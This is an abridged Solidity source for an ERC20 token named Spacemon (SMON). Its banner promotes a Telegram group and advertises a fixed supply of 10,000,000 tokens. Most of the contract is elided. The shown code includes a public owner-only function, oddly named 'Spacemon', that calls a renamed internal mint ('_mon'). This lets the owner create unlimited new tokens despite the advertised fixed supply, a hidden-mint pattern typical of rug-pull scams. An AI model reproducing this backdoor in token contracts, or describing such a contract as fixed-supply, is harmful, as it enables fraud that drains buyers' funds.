 ...
 *  ╱╱╱╰╯
 * 
 *          Telegram Group - @spacemonofficial
 * 
 *              Name   : Spacemon
 *              Symbol : SMON
 *              Supply 10.000.000
 ...
 *
 *      About Us
 *      Telegram : https://t.me/spacemonofficial
 * 
 */
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function Spacemon(uint256 amount) public onlyOwner {
    _mon(msg.sender, amount);
    }
    ...
    function _mon(address account, uint256 amount) internal virtual {
...
contract Spacemon is ERC20 {

    uint tokenTotalSupply = 10000000; // 10 Million Token Supply

    constructor() public ERC20("Spacemon", "SMON") {
        _mon(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}